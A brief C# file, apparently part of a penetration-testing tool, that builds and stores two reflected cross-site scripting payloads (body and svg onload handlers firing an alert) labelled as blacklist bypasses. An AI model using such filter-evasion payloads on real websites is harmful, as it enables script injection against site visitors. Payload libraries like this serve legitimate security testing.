namespace AllTheThings
{
    #region refrences
    // Project
    using PayloadLibrary.CrossSiteScriptingPayloadLibrary;
    #endregion

    static class BuildCrossSitePayloads
    {
        public static void BuildCrossSiteScriptingPayloads()
        {
            var xssLib = new ReflectedCrossSiteScriptingPayloadLibrary();
            xssLib.StorePayload(xssLib.CreatePayload("body", "onload", @"alert('l33t')", "html4", "blacklistbypass"));
            xssLib.StorePayload(xssLib.CreatePayload("svg", "onload", @"alert('l33t')", "html5", "blacklistbypass"));
        }
    }
}
